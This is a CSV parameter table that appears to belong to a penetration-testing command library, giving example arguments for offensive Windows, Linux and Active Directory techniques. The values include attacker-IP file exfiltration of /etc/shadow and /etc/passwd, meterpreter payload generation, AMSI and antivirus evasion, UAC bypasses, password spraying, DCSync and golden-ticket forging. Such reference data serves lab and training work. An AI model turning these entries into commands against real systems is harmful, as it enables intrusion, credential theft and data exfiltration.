"command_id","variable_id","position","example","required"
"chmod-numeric-permissions","cb16939f9e49530d","0","755","True"
"chmod-numeric-permissions","3e363ed1bddd7718","1","script.sh","True"
"chmod-writable","3e363ed1bddd7718","0","config.txt","True"
"chown-file","8bf07c964604e256","0","www-data","True"
"chown-file","467b0e3887f56e71","1","www-data","True"
"chown-file","3e363ed1bddd7718","2","/var/www/shell.php","True"
"cp-file","08ad5c76e23be9d9","0","/usr/share/exploits/shell.php","True"
"cp-file","b29e0188261bb8ce","1","/tmp/shell.php","True"
"mv-file","08ad5c76e23be9d9","0","exploit.py","True"
"mv-file","b29e0188261bb8ce","1","exploit_backup.py","True"
"rm-file","3e363ed1bddd7718","0","/tmp/exploit.py","True"
"touch-file","3e363ed1bddd7718","0","/tmp/test.txt","True"
"ln-symbolic","face8a1865a28492","0","/usr/share/wordlists/rockyou.txt","True"
"ln-symbolic","2ad5b2f7cd20c450","1","rockyou.txt","True"
"find-files","e26d08a3b58ba1f7","0","/var/www","True"
"find-files","94dc7e6af39d933b","1","""*.php""","True"
"cat-file","3e363ed1bddd7718","0","/etc/passwd","True"
"grep-file","94dc7e6af39d933b","0","password","True"
"grep-file","3e363ed1bddd7718","1","/etc/config.conf","True"
"head-file","281e6bd1f1d3923e","0","10","False"
"head-file","3e363ed1bddd7718","1","log.txt","True"
"tail-file","281e6bd1f1d3923e","0","10","False"
"tail-file","3e363ed1bddd7718","1","log.txt","True"
"less-file","3e363ed1bddd7718","0","large_file.txt","True"
"wc-file","3e363ed1bddd7718","0","wordlist.txt","True"
"tar-extract","3e363ed1bddd7718","0","exploit.tar.gz","True"
"tar-create","e252e97ce258b597","0","backup.tar.gz","True"
"tar-create","eec22b24f6583947","1","/tmp/loot/*","True"
"unzip-file","3e363ed1bddd7718","0","exploit.zip","True"
"gzip-compress","3e363ed1bddd7718","0","large_file.txt","True"
"gunzip-decompress","3e363ed1bddd7718","0","file.gz","True"
"verify-ntlm-hash","466e566fa12c7f09","0","hashes.txt","True"
"verify-web-server-up","face8a1865a28492","0","","True"
"verify-web-server-up","f4da422801e90d2e","1","80","False"
"verify-mimikatz-available","98b2a6bb414b1a8c","0","C:\Tools\Mimikatz","True"
"verify-rubeus-available","ad61535230dcde25","0","C:\Tools\Rubeus","True"
"verify-rdp-service-running","face8a1865a28492","0","","True"
"verify-socks-proxy-running","3ef91140af5aa921","0","1080","True"
"verify-credentials","face8a1865a28492","0","","True"
"verify-credentials","d96fe655f106be0f","1","","True"
"verify-credentials","3c5dfc5cec43fca4","2","","True"
"verify-network-connectivity","face8a1865a28492","0","","True"
"verify-network-connectivity","f4da422801e90d2e","1","80","False"
"verify-file-exists","0843939c4a81ba4e","0","","True"
"verify-port-open","face8a1865a28492","0","","True"
"verify-port-open","f4da422801e90d2e","1","","True"
"verify-sql-injection-vulnerable","face8a1865a28492","0","","True"
"verify-sql-injection-vulnerable","05c3b083fb3ab477","1","login.php","True"
"verify-sql-injection-vulnerable","977ef033079dfa1b","2","id","True"
"verify-sql-injection-vulnerable","fe5d0b97f12990be","3","1","True"
"verify-smb-null-session","face8a1865a28492","0","","True"
"verify-ldap-anonymous-bind","face8a1865a28492","0","","True"
"ft-certutil-download","771cc56dcaeb12b8","0","10.10.14.5","True"
"ft-certutil-download","f4da422801e90d2e","1","8000","True"
"ft-certutil-download","3e363ed1bddd7718","2","nc.exe","True"
"ft-certutil-download","e252e97ce258b597","3","nc.exe","True"
"ft-powershell-iwr","771cc56dcaeb12b8","0","10.10.14.5","True"
"ft-powershell-iwr","f4da422801e90d2e","1","8000","True"
"ft-powershell-iwr","3e363ed1bddd7718","2","winPEAS.exe","True"
"ft-powershell-iwr","e252e97ce258b597","3","C:\Temp\winPEAS.exe","True"
"ft-powershell-webclient","771cc56dcaeb12b8","0","10.10.14.5","True"
"ft-powershell-webclient","f4da422801e90d2e","1","8000","True"
"ft-powershell-webclient","3e363ed1bddd7718","2","mimikatz.exe","True"
"ft-powershell-webclient","e252e97ce258b597","3","C:\Windows\Temp\mimikatz.exe","True"
"ft-smb-download","771cc56dcaeb12b8","0","10.10.14.5","True"
"ft-smb-download","df84dcd52099d866","1","share","True"
"ft-smb-download","3e363ed1bddd7718","2","nc.exe","True"
"ft-smb-download","b29e0188261bb8ce","3","C:\Temp\nc.exe","True"
"ft-bitsadmin-download","0f330a22d2ca2f65","0","myDownload","True"
"ft-bitsadmin-download","771cc56dcaeb12b8","1","10.10.14.5","True"
"ft-bitsadmin-download","f4da422801e90d2e","2","8000","True"
"ft-bitsadmin-download","3e363ed1bddd7718","3","payload.exe","True"
"ft-bitsadmin-download","e252e97ce258b597","4","C:\Windows\Temp\payload.exe","True"
"ft-powershell-upload","771cc56dcaeb12b8","0","10.10.14.5","True"
"ft-powershell-upload","f4da422801e90d2e","1","80","True"
"ft-powershell-upload","3e363ed1bddd7718","2","C:\Users\user\Desktop\proof.txt","True"
"ft-smb-upload","3e363ed1bddd7718","0","C:\Users\user\Desktop\data.zip","True"
"ft-smb-upload","771cc56dcaeb12b8","1","10.10.14.5","True"
"ft-smb-upload","df84dcd52099d866","2","share","True"
"ft-curl-upload","3e363ed1bddd7718","0","/etc/shadow","True"
"ft-curl-upload","771cc56dcaeb12b8","1","10.10.14.5","True"
"ft-curl-upload","f4da422801e90d2e","2","80","True"
"ft-nc-receive","7ef180ba63d75600","0","4444","True"
"ft-nc-receive","e252e97ce258b597","1","received_file.txt","True"
"ft-nc-send","771cc56dcaeb12b8","0","10.10.14.5","True"
"ft-nc-send","7ef180ba63d75600","1","4444","True"
"ft-nc-send","3e363ed1bddd7718","2","/etc/passwd","True"
"ft-powershell-tcp-send","771cc56dcaeb12b8","0","10.10.14.5","True"
"ft-powershell-tcp-send","7ef180ba63d75600","1","4444","True"
"ft-powershell-tcp-send","3e363ed1bddd7718","2",".\hashes.kerberoast","True"
"ft-file-verify-md5","3e363ed1bddd7718","0","LinEnum.sh","True"
"ft-powershell-execute-memory","771cc56dcaeb12b8","0","10.10.14.5","True"
"ft-powershell-execute-memory","4822495a9be6f642","1","Invoke-Mimikatz","True"
"ft-base64-encode","3e363ed1bddd7718","0","binary.exe","True"
"ft-scp-upload","3e363ed1bddd7718","0","exploit.sh","True"
"ft-scp-upload","d96fe655f106be0f","1","user","True"
"ft-scp-upload","face8a1865a28492","2","192.168.45.100","True"
"ft-scp-download","d96fe655f106be0f","0","user","True"
"ft-scp-download","face8a1865a28492","1","192.168.45.100","True"
"ft-scp-download","a277472e02596adb","2","/home/user/proof.txt","True"
"ft-scp-download","a068956ab8ddab10","3","./proof.txt","True"
"ft-wget-download","771cc56dcaeb12b8","0","10.10.14.5","True"
"ft-wget-download","f4da422801e90d2e","1","8000","True"
"ft-wget-download","3e363ed1bddd7718","2","linpeas.sh","True"
"ft-wget-download","e252e97ce258b597","3","/tmp/linpeas.sh","False"
"ft-curl-download","771cc56dcaeb12b8","0","10.10.14.5","True"
"ft-curl-download","f4da422801e90d2e","1","8000","True"
"ft-curl-download","3e363ed1bddd7718","2","exploit.sh","True"
"ft-curl-download","e252e97ce258b597","3","/tmp/exploit.sh","True"
"ft-bash-dev-tcp","771cc56dcaeb12b8","0","10.10.14.5","True"
"ft-bash-dev-tcp","f4da422801e90d2e","1","4444","True"
"ft-bash-dev-tcp","e252e97ce258b597","2","/tmp/file","True"
"ft-python-http-server","f4da422801e90d2e","0","8000","False"
"ft-smb-server","935870a7002cfe24","0","share","True"
"ft-smb-server","9d06ad462367b532","1",".","True"
"ft-uploadserver","f4da422801e90d2e","0","80","False"
"lsof-port-specific","f4da422801e90d2e","0","80","True"
"fuser-port-tcp","f4da422801e90d2e","0","443","True"
"win-tasklist-pid","fd32abb2cb1a2eb7","0","1234","True"
"win-wmic-process-pid","fd32abb2cb1a2eb7","0","4567","True"
"win-sc-query-config","799d349b131e1a47","0","Spooler","True"
"ps-grep-pattern","94dc7e6af39d933b","0","apache|nginx","True"
"ps-grep-extract-pid","9b788b4be902921e","0","sshd","True"
"proc-cmdline-specific-pid","fd32abb2cb1a2eb7","0","1234","True"
"crontab-user-direct-read","d96fe655f106be0f","0","www-data","True"
"lsof-directory-non-recursive","9d06ad462367b532","0","/var/www/html","True"
"crontab-user-specific","d96fe655f106be0f","0","root","True"
"win-ps-scheduled-task-info","c8d3e30d460cd202","0","MyBackup","True"
"win-schtasks-task-xml","c81e2e6e70ac3bf3","0","\Microsoft\Windows\MyTask","True"
"tail-follow-log","28a38aa3f4553dcb","0","/var/log/syslog","True"
"tail-follow-filter","28a38aa3f4553dcb","0","/var/log/auth.log","True"
"tail-follow-filter","94dc7e6af39d933b","1","Failed password","True"
"tail-follow-multiple","6dc946cc027a036b","0","/var/log/syslog","True"
"tail-follow-multiple","313d31f381a0f075","1","/var/log/auth.log","True"
"journalctl-service-follow","7bccb896c53b4fe4","0","ssh","True"
"journalctl-priority-filter","5c23ce822ca0712c","0","err","True"
"journalctl-time-range","688ad68386c350d1","0","2024-01-01 10:00:00","True"
"systemctl-list","0fdc22ea6ab72eed","0","running","False"
"lsof-list","90aae15ca60cda0b","0","TCP","False"
"lsof-list","f4da422801e90d2e","1","8080","False"
"du-directory-usage","9d06ad462367b532","0","/var/log","True"
"lsof-user-files","d96fe655f106be0f","0","www-data","True"
"lsof-directory-usage","9d06ad462367b532","0","/var/www","True"
"fuser-directory-processes","9d06ad462367b532","0","/mnt/share","True"
"pgrep-pattern-search","94dc7e6af39d933b","0","apache|nginx|mysql","True"
"pidof-exact","9b788b4be902921e","0","apache2","True"
"ps-user-filter","d96fe655f106be0f","0","www-data","True"
"ps-pid-details","fd32abb2cb1a2eb7","0","1234","True"
"sleep-timer-validation","18e6ee260c4654ac","0","10000","True"
"sleep-timer-validation","3c905a0ab05c085e","1","9.5","True"
"large-memory-allocation","4b163deb43df24aa","0","100000000","True"
"check-processor-count","351b0cca07a1a931","0","2","True"
"check-recent-files","d7e55158f6b205fe","0","5","True"
"check-uptime","e0173454853ffcf1","0","10","True"
"amsi-base64-staging","eb7f9e821d84eb5f","0","","False"
"jscript-self-modifying-exe","8fd707ca6b0af2a8","0","payload.ps1","True"
"jscript-self-modifying-exe","e0ca486dc88af880","1","IEX (New-Object Net.WebClient).DownloadString('http://...')","True"
"jscript-com-execution","8f54a3b95ece8bf7","0","powershell.exe -nop -w hidden -c ...","True"
"jscript-com-execution","c8d3e30d460cd202","1","WindowsUpdate","False"
"wscript-cscript-execution","2ecf07c2a9d98756","0","payload.js","True"
"windbg-attach-process","fd32abb2cb1a2eb7","0","1234","True"
"windbg-breakpoint-commands","e4fdee416aba032d","0","amsi","True"
"windbg-breakpoint-commands","39caa8c490911efc","1","AmsiScanBuffer","True"
"windbg-breakpoint-commands","d30a11ed7a62a20b","2","0","False"
"windbg-memory-inspection","d557ab48a18a5dcd","0","rsp","True"
"windbg-memory-inspection","f954b1f77df13614","1","10","False"
"windbg-disassemble","d557ab48a18a5dcd","0","rip","False"
"windbg-disassemble","e4fdee416aba032d","1","amsi","False"
"windbg-disassemble","39caa8c490911efc","2","AmsiScanBuffer","False"
"windbg-disassemble","f954b1f77df13614","3","20","False"
"frida-trace-amsi","fd32abb2cb1a2eb7","0","5432","True"
"windbg-edit-memory","d557ab48a18a5dcd","0","7ffa12345678","True"
"windbg-edit-memory","67194694660a5f3e","1","90909090","True"
"windbg-edit-memory","4ce0a55ef209ee09","2","48","True"
"windbg-edit-memory","8b187d8d78aff480","3","0x12","True"
"windbg-edit-memory","56da014203733737","4","0x34","True"
"find-av-signature","6c77d34a0d443a1e","0","10000","True"
"find-av-signature","ec2539f258d85ce6","1","C:\Tools\payload.exe","True"
"find-av-signature","500b9b9ab0c50aa4","2","C:\Tools\avtest","True"
"modify-signature-bytes","7a9e82ef7774f92e","0","C:\Tools\payload.exe","True"
"modify-signature-bytes","8fd707ca6b0af2a8","1","C:\Tools\payload_modified.exe","True"
"modify-signature-bytes","ac5527af2b7acd68","2","$bytes[18867] = 0x00","True"
"msfvenom-encoder-shikata","577bbe7d9b115470","0","windows/meterpreter/reverse_https","True"
"msfvenom-encoder-shikata","771cc56dcaeb12b8","1","10.10.14.5","True"
"msfvenom-encoder-shikata","7ef180ba63d75600","2","443","True"
"msfvenom-encoder-shikata","e9e402e56ec0fb62","3","10","False"
"msfvenom-encoder-shikata","8fd707ca6b0af2a8","4","payload.exe","True"
"msfvenom-encoder-zutto","577bbe7d9b115470","0","windows/x64/meterpreter/reverse_https","True"
"msfvenom-encoder-zutto","771cc56dcaeb12b8","1","10.10.14.5","True"
"msfvenom-encoder-zutto","7ef180ba63d75600","2","443","True"
"msfvenom-encoder-zutto","e9e402e56ec0fb62","3","10","False"
"msfvenom-encoder-zutto","8fd707ca6b0af2a8","4","payload64.exe","True"
"msfvenom-encrypt-aes","577bbe7d9b115470","0","windows/x64/meterpreter/reverse_https","True"
"msfvenom-encrypt-aes","771cc56dcaeb12b8","1","10.10.14.5","True"
"msfvenom-encrypt-aes","7ef180ba63d75600","2","443","True"
"msfvenom-encrypt-aes","bd69b650765c9bbf","3","MySecretKey2024","True"
"msfvenom-encrypt-aes","8fd707ca6b0af2a8","4","payload_aes.exe","True"
"msfvenom-template-injection","577bbe7d9b115470","0","windows/x64/meterpreter/reverse_https","True"
"msfvenom-template-injection","771cc56dcaeb12b8","1","10.10.14.5","True"
"msfvenom-template-injection","7ef180ba63d75600","2","443","True"
"msfvenom-template-injection","f47fb69c327b01c2","3","/usr/share/windows-binaries/nc.exe","True"
"msfvenom-template-injection","8fd707ca6b0af2a8","4","payload_injected.exe","True"
"clamscan-test","ec2539f258d85ce6","0","C:\Tools\payload.exe","True"
"csharp-shellcode-runner-basic","f5cbd8d711fa1718","0","0xfc,0x48,0x83,0xe4,0xf0","True"
"csharp-caesar-encrypt","172870e368f987ff","0","0xfc,0x48,0x83","True"
"csharp-caesar-encrypt","bd69b650765c9bbf","1","2","True"
"csharp-xor-encrypt","172870e368f987ff","0","0xfc,0x48,0x83","True"
"csharp-xor-encrypt","09a0fb9e70f1751a","1","0xAA","True"
"csharp-sleep-timer","18e6ee260c4654ac","0","10000","True"
"csharp-sleep-timer","3c905a0ab05c085e","1","9.5","True"
"msfvenom-csharp-payload","771cc56dcaeb12b8","0","10.10.14.5","True"
"msfvenom-csharp-payload","7ef180ba63d75600","1","443","True"
"compile-csharp-runner","96b1255c43fa2568","0","runner.exe","True"
"compile-csharp-runner","cf6d2c5ba8389413","1","Program.cs","True"
"fodhelper-uac-bypass","6f9316cf106d8659","0","cmd /c start powershell.exe","True"
"eventvwr-uac-bypass","6f9316cf106d8659","0","cmd /c start powershell.exe","True"
"vba-shellcode-runner-basic","df075c772e0f5393","0","232, 130, 0, 0, 0, ...","True"
"vba-caesar-cipher","f3aa88c52411673b","0","254, 74, 133, ...","True"
"vba-caesar-cipher","bd69b650765c9bbf","1","2","True"
"vba-wmi-dechain","c8d73f4968103405","0","SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...","True"
"vba-stomping","6081f4a6e8eda239","0","payload.doc","True"
"vba-stomping","b00a9ab5b2052d22","1","payload_stomped.doc","True"
"import-powerview","e26d08a3b58ba1f7","0","C:\Tools","True"
"get-netuser","d96fe655f106be0f","0","Administrator","False"
"get-netgroup","467b0e3887f56e71","0","Domain Admins","False"
"kerbrute-userenum-ad","13953c1091c80795","0","corp.com","True"
"kerbrute-userenum-ad","728043f16ef5d8d0","1","192.168.50.70","True"
"kerbrute-userenum-ad","04ae8fec5515d43a","2","/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt","True"
"crackmapexec-rid-cycling","face8a1865a28492","0","192.168.50.70","True"
"crackmapexec-rid-cycling","d96fe655f106be0f","1","guest","True"
"crackmapexec-rid-cycling","3c5dfc5cec43fca4","2","''","True"
"ldapsearch-users-ad","face8a1865a28492","0","192.168.50.70","True"
"ldapsearch-users-ad","8bddd0c5c3bdc913","1","DC=corp,DC=com","True"
"enum4linux-users-ad","face8a1865a28492","0","192.168.50.70","True"
"spray-passwords-ldap","3c5dfc5cec43fca4","0","Nexus123!","True"
"crackmapexec-smb-spray","face8a1865a28492","0","192.168.50.75","True"
"crackmapexec-smb-spray","04ae8fec5515d43a","1","users.txt","True"
"crackmapexec-smb-spray","3c5dfc5cec43fca4","2","Nexus123!","True"
"crackmapexec-smb-spray","13953c1091c80795","3","corp.com","True"
"kerbrute-passwordspray","13953c1091c80795","0","corp.com","True"
"kerbrute-passwordspray","728043f16ef5d8d0","1","192.168.50.70","True"
"kerbrute-passwordspray","04ae8fec5515d43a","2","valid_users.txt","True"
"kerbrute-passwordspray","3c5dfc5cec43fca4","3","Nexus123!","True"
"crackmapexec-winrm-spray","face8a1865a28492","0","192.168.50.75","True"
"crackmapexec-winrm-spray","04ae8fec5515d43a","1","users.txt","True"
"crackmapexec-winrm-spray","3c5dfc5cec43fca4","2","Nexus123!","True"
"crackmapexec-winrm-spray","13953c1091c80795","3","corp.com","True"
"petitpotam-coerce","d96fe655f106be0f","0","user","False"
"petitpotam-coerce","3c5dfc5cec43fca4","1","","False"
"petitpotam-coerce","13953c1091c80795","2","corp.local","False"
"petitpotam-coerce","5965f0c9c9b92265","3","192.168.50.100","True"
"petitpotam-coerce","9ccc22fe6c0d6715","4","192.168.50.70","True"
"coercer-coerce","d96fe655f106be0f","0","user","True"
"coercer-coerce","3c5dfc5cec43fca4","1","","True"
"coercer-coerce","13953c1091c80795","2","corp.local","True"
"coercer-coerce","5965f0c9c9b92265","3","192.168.50.100","True"
"coercer-coerce","9ccc22fe6c0d6715","4","192.168.50.70","True"
"printerbug-trigger","13953c1091c80795","0","corp.local","True"
"printerbug-trigger","d96fe655f106be0f","1","user","True"
"printerbug-trigger","3c5dfc5cec43fca4","2","","True"
"printerbug-trigger","9ccc22fe6c0d6715","3","192.168.50.70","True"
"printerbug-trigger","5965f0c9c9b92265","4","192.168.50.100","True"
"dfscoerce-trigger","d96fe655f106be0f","0","user","True"
"dfscoerce-trigger","3c5dfc5cec43fca4","1","","True"
"dfscoerce-trigger","13953c1091c80795","2","corp.local","True"
"dfscoerce-trigger","5965f0c9c9b92265","3","192.168.50.100","True"
"dfscoerce-trigger","9ccc22fe6c0d6715","4","192.168.50.70","True"
"ntlmrelayx-adcs","4315be57bbbba094","0","ca.corp.local","True"
"ntlmrelayx-adcs","9bcbbb7a618afc13","1","DomainController","True"
"ad-dcsync-mimikatz-user","13953c1091c80795","0","corp","True"
"ad-dcsync-mimikatz-user","d96fe655f106be0f","1","dave","True"
"ad-dcsync-mimikatz-krbtgt","13953c1091c80795","0","corp","True"
"ad-dcsync-mimikatz-administrator","13953c1091c80795","0","corp","True"
"ad-golden-ticket-dcsync-krbtgt","e711681a306271ed","0","corp.com","True"
"ad-golden-ticket-mimikatz-create","d96fe655f106be0f","0","jen","True"
"ad-golden-ticket-mimikatz-create","e711681a306271ed","1","corp.com","True"
"ad-golden-ticket-mimikatz-create","8ef83e9493bd5de1","2","S-1-5-21-1987370270-658905905-1781884369","True"
"ad-golden-ticket-mimikatz-create","c311de58b58ccb4c","3","1693c6cefafffc7af11ef34d1c788f47","True"
"ad-golden-ticket-rubeus-create","d96fe655f106be0f","0","jen","True"
"ad-golden-ticket-rubeus-create","e711681a306271ed","1","corp.com","True"
"ad-golden-ticket-rubeus-create","8ef83e9493bd5de1","2","S-1-5-21-1987370270-658905905-1781884369","True"
"ad-golden-ticket-rubeus-create","c311de58b58ccb4c","3","1693c6cefafffc7af11ef34d1c788f47","True"
"ad-golden-ticket-psexec-use","71ea890e569ad60c","0","DC1","True"
"ad-golden-ticket-ticketer-create","8b6f2c085e59f57d","0","aad3b435b51404eeaad3b435b51404ee","True"
"ad-golden-ticket-ticketer-create","8ef83e9493bd5de1","1","S-1-5-21-1234567890-1234567890-1234567890","True"
"ad-golden-ticket-ticketer-create","13953c1091c80795","2","corp.local","True"
"ad-golden-ticket-ticketer-create","d96fe655f106be0f","3","Administrator","True"
"kerberos-time-sync","728043f16ef5d8d0","0","192.168.50.70","True"
"kerberos-rubeus-asktgt","8bf07c964604e256","0","Administrator","True"
"kerberos-rubeus-asktgt","11c745735b462353","1","Password123!","True"
"kerberos-rubeus-asktgt","13953c1091c80795","2","corp.local","True"
"impacket-getnpusers-asreproast","728043f16ef5d8d0","0","192.168.50.70","True"
"impacket-getnpusers-asreproast","8fd707ca6b0af2a8","1","hashes.asreproast","True"
"impacket-getnpusers-asreproast","13953c1091c80795","2","corp.com","True"
"impacket-getnpusers-asreproast","d96fe655f106be0f","3","pete","True"
"impacket-getnpusers-identify","728043f16ef5d8d0","0","192.168.50.70","True"
"impacket-getnpusers-identify","13953c1091c80795","1","corp.com","True"
"impacket-getnpusers-identify","d96fe655f106be0f","2","pete","False"
"targeted-asreproast-set","d96fe655f106be0f","0","targetuser","True"
"targeted-asreproast-cleanup","d96fe655f106be0f","0","targetuser","True"
"enter-pssession","face8a1865a28492","0","FILESERVER01.corp.com","True"
"invoke-command","face8a1865a28492","0","WS01.corp.com,WS02.corp.com","True"
"invoke-command","8f54a3b95ece8bf7","1","whoami; hostname; ipconfig","True"
"test-wsman-connectivity","face8a1865a28492","0","WS01.corp.com","True"
"test-admin-share-access","face8a1865a28492","0","FILESERVER01.corp.com","True"
"net-use-admin-share","face8a1865a28492","0","WS01.corp.com","True"
"net-use-admin-share","13953c1091c80795","1","CORP","True"
"net-use-admin-share","d96fe655f106be0f","2","administrator","True"
"net-use-admin-share","3c5dfc5cec43fca4","3","P@ssw0rd123","True"
"dir-admin-share","face8a1865a28492","0","FILESERVER01","True"
"dir-admin-share","df84dcd52099d866","1","C$","True"
"copy-file-admin-share","33978a76b5aa87d6","0","C:\Tools\mimikatz.exe","True"
"copy-file-admin-share","face8a1865a28492","1","FILESERVER01","True"
"copy-file-admin-share","13b96b9dca488e01","2","Temp\mimikatz.exe","True"
"ad-vssadmin-create-shadow","acc58243bb352125","0","C","True"
"ad-vshadow-create-shadow","acc58243bb352125","0","C","True"
"ad-diskshadow-create-shadow","2ecf07c2a9d98756","0","C:\Windows\Temp\shadow.txt","True"
"ad-wmic-create-shadow","acc58243bb352125","0","C","True"
"ad-copy-ntds-from-shadow","7701024049801093","0","2","True"
"ad-copy-ntds-from-shadow","1f1437ad32c12c45","1","C:\Temp\ntds.dit.bak","True"
"ad-reg-save-system-hive","1f1437ad32c12c45","0","C:\Temp\system.bak","True"
"ad-secretsdump-parse-ntds","a1690f36da729c84","0","ntds.dit.bak","True"
"ad-secretsdump-parse-ntds","fc742c5c6411648d","1","system.bak","True"
"ad-vssadmin-delete-shadows","acc58243bb352125","0","C","True"
"ad-dcsync-mimikatz-single-user","e3d40d4f13e97802","0","corp.com","True"
"ad-dcsync-mimikatz-single-user","17a58c240a5c9bf5","1","Administrator","True"
"ad-dcsync-impacket-secretsdump-user","17a58c240a5c9bf5","0","Administrator","True"
"ad-dcsync-impacket-secretsdump-user","fce64b628c8dba70","1","corp.com","True"
"ad-dcsync-impacket-secretsdump-user","ae825db24af5b730","2","administrator","True"
"ad-dcsync-impacket-secretsdump-user","a982755ecea00bae","3","Password123!","True"
"ad-dcsync-impacket-secretsdump-user","0e519989b5ebf5b5","4","192.168.50.70","True"
"ad-dcsync-check-permissions","fce64b628c8dba70","0","corp","True"
"ad-dcsync-check-permissions","46a936b2da16da49","1","com","True"
"ad-dcsync-check-replication-rights","8bddd0c5c3bdc913","0","DC=corp,DC=com","True"
"ad-dcsync-check-replication-rights","13953c1091c80795","1","CORP","True"
"ad-dcsync-check-replication-rights","d96fe655f106be0f","2","jeffadmin","True"
"kerberos-rubeus-ptt","ad908f931774e3ea","0","admin.kirbi","True"
"gmsadumper","d96fe655f106be0f","0","user","True"
"gmsadumper","3c5dfc5cec43fca4","1","","True"
"gmsadumper","13953c1091c80795","2","corp.local","True"
"bloodyad-gmsa","13953c1091c80795","0","corp.local","True"
"bloodyad-gmsa","d96fe655f106be0f","1","user","True"
"bloodyad-gmsa","3c5dfc5cec43fca4","2","","True"
"bloodyad-gmsa","728043f16ef5d8d0","3","192.168.50.70","True"
"bloodyad-gmsa","93fb40c6bfa2c602","4","svc_gmsa","True"
"laps-password-cme","face8a1865a28492","0","192.168.50.0/24","True"
"laps-password-cme","d96fe655f106be0f","1","user","True"
"laps-password-cme","3c5dfc5cec43fca4","2","","True"
"laps-password-cme","13953c1091c80795","3","corp.local","True"
"laps-password-ldapsearch","728043f16ef5d8d0","0","192.168.50.70","True"
"laps-password-ldapsearch","d96fe655f106be0f","1","user","True"
"laps-password-ldapsearch","13953c1091c80795","2","corp.local","True"
"laps-password-ldapsearch","3c5dfc5cec43fca4","3","","True"
"laps-password-ldapsearch","9b822b208102639a","4","corp","True"
"laps-password-ldapsearch","de3c8f633d5687d7","5","local","True"
"laps-password-ldapsearch","d87c8e6b91743b46","6","WS01","True"
"powerview-gmsa","93fb40c6bfa2c602","0","svc_gmsa","True"
"certipy-find","d96fe655f106be0f","0","user","True"
"certipy-find","13953c1091c80795","1","corp.local","True"
"certipy-find","3c5dfc5cec43fca4","2","Password123","True"
"certipy-find","728043f16ef5d8d0","3","192.168.50.70","True"
"certipy-req-esc1","d96fe655f106be0f","0","user","True"
"certipy-req-esc1","13953c1091c80795","1","corp.local","True"
"certipy-req-esc1","3c5dfc5cec43fca4","2","","True"
"certipy-req-esc1","876efa06f133f8b8","3","corp-CA","True"
"certipy-req-esc1","ac75c6f410a20896","4","ca.corp.local","True"
"certipy-req-esc1","9bcbbb7a618afc13","5","UserAuth","True"
"certipy-req-esc1","7d06dbae0eb27714","6","administrator","True"
"certipy-auth","d2f7841e62ddcde6","0","administrator.pfx","True"
"certipy-auth","728043f16ef5d8d0","1","192.168.50.70","True"
"certipy-req-esc4","d96fe655f106be0f","0","user","True"
"certipy-req-esc4","13953c1091c80795","1","corp.local","True"
"certipy-req-esc4","3c5dfc5cec43fca4","2","","True"
"certipy-req-esc4","9bcbbb7a618afc13","3","UserAuth","True"
"certipy-req-esc7","876efa06f133f8b8","0","corp-CA","True"
"certipy-req-esc7","d96fe655f106be0f","1","user","True"
"certipy-req-esc7","13953c1091c80795","2","corp.local","True"
"certipy-req-esc7","3c5dfc5cec43fca4","3","","True"
"certipy-forge","ac9b535edadc80ae","0","ca.pfx","True"
"certipy-forge","7d06dbae0eb27714","1","administrator","True"
"certipy-forge","13953c1091c80795","2","corp.local","True"
"certipy-forge","9b822b208102639a","3","corp","True"
"certipy-forge","de3c8f633d5687d7","4","local","True"
"certipy-shadow","d96fe655f106be0f","0","user","True"
"certipy-shadow","13953c1091c80795","1","corp.local","True"
"certipy-shadow","3c5dfc5cec43fca4","2","","True"
"certipy-shadow","e726510e7d8e174d","3","DC01$","True"
"certify-request","876efa06f133f8b8","0","ca.corp.local\corp-CA","True"
"certify-request","9bcbbb7a618afc13","1","UserAuth","True"
"certify-request","7d06dbae0eb27714","2","administrator","True"
"rubeus-asktgt-cert","7d06dbae0eb27714","0","administrator","True"
"rubeus-asktgt-cert","d2f7841e62ddcde6","1","C:\Temp\admin.pfx","True"
"rubeus-asktgt-cert","1c33745722c017a2","2","password123","False"
"mimikatz-overpass-the-hash","d96fe655f106be0f","0","administrator","True"
"mimikatz-overpass-the-hash","13953c1091c80795","1","corp.com","True"
"mimikatz-overpass-the-hash","715a1e029c62ba8c","2","aad3b435b51404eeaad3b435b51404ee","True"
"mimikatz-dcsync-user","13953c1091c80795","0","corp.com","True"
"mimikatz-dcsync-user","7d06dbae0eb27714","1","Administrator","True"
"mimikatz-dcsync-all","13953c1091c80795","0","corp.com","True"
"mimikatz-minidump-parse","44efb48b1cd83541","0","lsass.dmp","True"
"rbcd-set-msds","261dd38e509bc089","0","YOURPC","True"
